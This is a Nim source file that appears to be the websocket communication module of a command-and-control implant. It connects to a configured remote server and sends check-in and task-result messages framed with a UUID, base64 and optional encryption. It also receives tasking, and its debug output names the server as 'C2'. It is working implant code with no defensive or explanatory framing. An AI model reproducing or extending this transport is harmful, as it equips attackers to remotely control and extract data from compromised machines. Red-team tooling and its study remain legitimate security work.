when defined(ENCRYPT_TRAFFIC):
  import ../crypto

import pkg/websocket
import asyncdispatch
import json
import std/options
import strutils
import ../structs
import ../config
import ../b64

template DBG(msg: string) =
  when defined(debug):
    echo msg

var wsClient: AsyncWebSocket = nil
var didLogHeaders = false

proc responseMatchesRequest(requestAction: string, response: JsonNode): bool =
  if requestAction.len == 0:
    return true

  let responseAction = response{"action"}.getStr("")
  if responseAction.len > 0 and responseAction == requestAction:
    return true

  if requestAction == "post_response" and response.hasKey("responses"):
    return true

  if requestAction == "get_tasking" and response.hasKey("tasks"):
    return true

  if requestAction == "checkin" and response.hasKey("status") and response.hasKey("id"):
    return true

  return false

proc closeClient() =
  if wsClient != nil:
    try:
      waitFor wsClient.close()
    except:
      discard
    wsClient = nil

proc normalizeWsUrl(): string =
  var host = connection.remoteEndpoint.strip()

  if not host.startsWith("ws://") and not host.startsWith("wss://"):
    if host.startsWith("http://"):
      host = "ws://" & host[7..^1]
    elif host.startsWith("https://"):
      host = "wss://" & host[8..^1]
    else:
      host = "ws://" & host

  if connection.callbackPort > 0 and host.rfind(":") == host.find(":"):
    host = host & ":" & $connection.callbackPort

  var endpoint = connection.postEndpoint.strip()
  if endpoint.len == 0:
    endpoint = "socket"
  if not endpoint.startsWith("/"):
    endpoint = "/" & endpoint

  if host.endsWith("/") and endpoint.startsWith("/"):
    endpoint = endpoint[1..^1]

  result = host & endpoint

proc buildWsHeaders(): seq[(string, string)] =
  result = @[]
  for header in connection.httpHeaders:
    result.add((header.key, header.value))

proc ensureConnected(): bool =
  if wsClient != nil:
    return true

  let wsUrl = normalizeWsUrl()
  try:
    if not didLogHeaders:
      didLogHeaders = true
      DBG("[*] Websocket URL -> " & wsUrl)
      for header in connection.httpHeaders:
        DBG("[*] Header -> " & header.key & ": " & header.value)

    wsClient = waitFor newAsyncWebsocketClient(wsUrl, additionalHeaders = buildWsHeaders())
    return true
  except:
    DBG("[-] Failed to establish websocket connection: " & getCurrentExceptionMsg())
    wsClient = nil
    return false


proc initialize*() =
  discard


proc sendAndRetrData*(data: JsonNode): Option[JsonNode] =
  if not ensureConnected():
    return none(JsonNode)

  let uuid = connection.uuid
  let requestAction = data{"action"}.getStr("")

  var encData: seq[byte]
  when defined(ENCRYPT_TRAFFIC):
    encData = encrypt($data, connection.encryptionKey)
  else:
    encData = cast[seq[byte]]($data)

  let framed = b64.encode(Base64Pad, cast[seq[byte]](uuid) & encData)

  let outbound = %* {
    "client": true,
    "data": framed,
    "tag": ""
  }

  try:
    waitFor wsClient.sendText($outbound)
    for _ in 0..4:
      let (opcode, rawMessage) = waitFor wsClient.readData()

      if opcode != Opcode.Text and opcode != Opcode.Binary:
        DBG("[-] Unexpected websocket opcode from C2")
        continue

      let wrapped = parseJson(rawMessage)
      if not wrapped.hasKey("data"):
        DBG("[-] Missing data field in websocket C2 response")
        continue

      let respText = wrapped["data"].getStr().strip()
      if respText.len == 0:
        DBG("[-] Empty websocket response body")
        continue

      var respBody: seq[byte]
      var decoded = false

      try:
        respBody = b64.decode(Base64Pad, respText)
        decoded = true
      except Base64Error:
        discard

      if not decoded:
        let normalizedResp = respText.replace('-', '+').replace('_', '/')
        try:
          respBody = b64.decode(Base64Pad, normalizedResp)
          decoded = true
        except Base64Error:
          discard

      if not decoded:
        DBG("[-] Invalid base64 in websocket response")
        continue

      if len(respBody) < 36:
        DBG("[-] Websocket response too short (missing UUID prefix)")
        continue

      var respJson: string
      when defined(ENCRYPT_TRAFFIC):
        let encRespJson = respBody[36..len(respBody)-1]
        respJson = decrypt(encRespJson, connection.encryptionKey)
      else:
        respJson = cast[string](respBody)[36..len(respBody)-1]

      let parsed = parseJson(respJson)
      if responseMatchesRequest(requestAction, parsed):
        return some(parsed)

      DBG("[-] Ignoring websocket packet not matching request action '" & requestAction & "'")

    DBG("[-] No matching websocket response received for request action '" & requestAction & "'")
    return none(JsonNode)
  except:
    DBG("[-] Websocket request/response failed")
    closeClient()
    return none(JsonNode)
